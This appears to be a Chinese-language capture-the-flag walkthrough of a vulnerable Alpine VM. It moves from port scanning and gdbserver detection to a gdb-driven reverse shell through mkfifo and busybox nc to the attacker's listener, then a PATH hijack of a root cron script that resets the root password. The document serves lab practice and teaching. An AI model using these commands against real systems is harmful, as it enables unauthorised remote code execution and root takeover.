# 信息收集

老规矩，先找出靶机 IP，然后挂后台扫端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l   
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
192.168.205.144 08:00:27:7d:b0:f7       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ef:a8:26       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.978 seconds (129.42 hosts/sec). 4 responded
                                                                                                                                                                                
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p 0-65535 192.168.205.144
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 00:52 -0500
Nmap scan report for 192.168.205.144
Host is up (0.00098s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
43923/tcp open  unknown
MAC Address: 08:00:27:7D:B0:F7 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.69 seconds
```

扫出来 22、80，还有一个 43923 端口 nmap 识别不出服务。

这里我走了很长一段弯路。Web 端去看了，有 info.php 和一个纯假 shell 的 eval.php。主页 index.php 虽然可以通过 action 和 file 参数结合 `/proc/self/root/` 跳回根目录读文件，但没有可以推进进展的东西。同时 43923 这个端口非常脆弱，大量发包扫描会直接把它扫死，当时在这里卡了很久，最后确定突破口只能在这个高危端口上。

# 探测 GDBServer

如果实在不知道 43923 是什么服务，有个耍赖皮的办法：直接看虚拟机的启动屏幕。

![image-20260304135734174](http://7r1UMPHK.github.io/image/20260304211639358.webp)

启动项里明明白白写着起了个 gdbserver。

如果不依赖这种“物理外挂”，正经的探测方式是向端口发送特定的 GDB 握手包。

```bash
┌──(kali㉿kali)-[/tmp]
└─$ printf '$qSupported#37' | timeout 2 nc 192.168.205.144 43923
+$PacketSize=2001f;QPassSignals+;QProgramSignals+;QStartupWithShell+;QEnvironmentHexEncoded+;QEnvironmentReset+;QEnvironmentUnset+;QSetWorkingDir+;QCatchSyscalls+;qXfer:libraries-svr4:read+;augmented-libraries-svr4-read+;qXfer:auxv:read+;qXfer:siginfo:read+;qXfer:siginfo:write+;qXfer:features:read+;QStartNoAckMode+;qXfer:osdata:read+;multiprocess+;fork-events+;vfork-events+;exec-events+;QNonStop+;QDisableRandomization+;qXfer:threads:read+;ConditionalTracepoints+;TraceStateVariables+;TracepointSource+;DisconnectedTracing+;StaticTracepoints+;InstallInTrace+;qXfer:statictrace:read+;qXfer:traceframe-info:read+;EnableDisableTracepoints+;QTBuffer:size+;tracenz+;ConditionalBreakpoints+;BreakpointCommands+;QAgent+;Qbtrace:bts+;Qbtrace-conf:bts:size+;Qbtrace:pt+;Qbtrace-conf:pt:size+;Qbtrace:off+;qXfer:btrace:read+;qXfer:btrace-conf:read+;swbreak+;hwbreak+;qXfer:exec-file:read+;vContSupported+;QThreadOptions=3;QThreadEvents+;no-resumed+#fa
```

看到返回内容里带了 `PacketSize`、`qXfer` 这些特有的字段，就能确诊这是 gdb remote 协议了。

# 漏洞利用与初始据点

gdbserver 暴露在公网可以直接弹 shell，这也是常规套路了。不过根据这个靶机的体积判断，底层大概率是 Alpine Linux，这意味着系统里没有 bash，只能指望 sh 或者 ash，并且可能有 busybox。
因为这个端口极其不稳定，死了还得重启虚拟机巨麻烦，所以 payload 必须尽量一发入魂。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

起个监听。

```bash
┌──(kali㉿kali)-[/tmp]
└─$ cat a.sh 
IP=192.168.205.144;LHOST=192.168.205.128;LPORT=8888
gdb -q -nx -ex "set pagination off" -ex "set confirm off" -ex "target extended-remote $IP:36127" -ex "set remote exec-file /bin/busybox" -ex "set args sh -c 'rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|/bin/busybox nc $LHOST $LPORT >/tmp/p'" -ex "run" -ex "quit"
                                                                                                                                                                                
┌──(kali㉿kali)-[/tmp]
└─$ bash a.sh 
Remote debugging using 192.168.205.144:36127
Starting program:  sh -c 'rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|/bin/busybox nc 192.168.205.128 8888 >/tmp/p'
Reading /bin/busybox from remote target...
⚠️ warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /bin/busybox from remote target...
Reading symbols from target:/bin/busybox...
(No debugging symbols found in target:/bin/busybox)
Reading /lib/ld-musl-x86_64.so.1 from remote target...
Reading /lib/ld-musl-x86_64.so.1 from remote target...
Reading /usr/lib/debug/lib/ld-musl-x86_64.so.1.debug from remote target...
Reading /usr/lib/debug/lib/ld-musl-x86_64.so.1.debug from remote target...
[Detaching after fork from child process 2533]
[Detaching after fork from child process 2534]
[Detaching after fork from child process 2535]
[Detaching after fork from child process 2536]
[Detaching after fork from child process 2537]
```

写了个脚本自动跑 gdb 配置，指定远程执行 `/bin/busybox` 并传入反弹 shell 的命令。执行后 gdb 成功附加上去并 fork 了子进程。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.144] 42107
/bin/sh: can't access tty; job control turned off
~ $ id
uid=1000(514) gid=1000(514) groups=1000(514)
```

切回监听窗口，shell 已经稳稳接到了，当前用户是 514。

# 环境稳定与提权信息收集

到手的是个残废 shell，老规矩先做交互式处理。

```bash
python3 -c 'import pty;pty.spawn("/bin/ash")'
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/ash
stty rows 36 columns 178
```

这里特意把 SHELL 设成了 /bin/ash 适配 Alpine。接着跑了个枚举脚本省事，搜集一波系统信息。

![image-20260304142209164](http://7r1UMPHK.github.io/image/20260304211636980.webp)

脚本结果显示 `/usr/local/bin` 目录我们当前用户有写入权限。其实在前面打 web 测试任意文件读取时，我通过读 `/proc` 下的文件已经察觉到这台机器上有个定时任务一直在跑，结合这里的写入权限，思路一下子就通了。

顺着定时任务往下查，找到了它调用的本体脚本。

![image-20260304142531974](http://7r1UMPHK.github.io/image/20260304211637910.webp)

看下这个 `/usr/bin/monitor` 的权限和内容。

```bash
~ $ ls -al /usr/bin/monitor
-rwxr-xr-x    1 root     root           141 Jan 24 01:33 /usr/bin/monitor
~ $ cat /usr/bin/monitor
#!/bin/sh
i=1
while [ $i -le 3 ]; do
    if [ ! -f /home/514/protected/secret ]; then
        warning
    fi
    sleep 2
    i=$((i+1))
done
~ $ cat /home/514/protected/secret
thisissupersecret!
```

这个 root 权限运行的 monitor 脚本逻辑很简单：每隔几秒检查 `secret` 文件存不存在，如果不存在，就执行 `warning`。我去读了一下 `secret`，里面的内容不是密码，纯粹是个干扰项。

# PATH 劫持提权

这里就是破局点了。脚本里调用 `warning` 的时候并没有写绝对路径（比如 `/usr/bin/warning`），这就意味着系统会去查 PATH 环境变量。而我们刚好对通常在 PATH 极前面的 `/usr/local/bin` 有写入权限，这就是明摆着的 PATH 劫持。

只要把 `secret` 文件干掉触发 `warning`，再在 `/usr/local/bin` 写个恶意的 `warning` 脚本，就能以 root 权限执行任意命令。

```bash
/tmp $ rm -rf /home/514/protected/secret
rm: can't remove '/home/514/protected/secret': Permission denied
/tmp $ mv /home/514/protected/ /home/514/1
/tmp $ echo 'echo "root:root123" | chpasswd' > /usr/local/bin/warning;chmod +x /usr/local/bin/warning
/tmp $ cat /usr/local/bin/warning
echo "root:root123" | chpasswd
/tmp $ su -
Password: 
Koishi:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
Koishi:~# cat /root/root.txt /home/514/user.txt 
flag{root-7bd5942949d04a7abfa7b9af22704ae2}
flag{user-dab89930872234e42142674ea25869dc}
```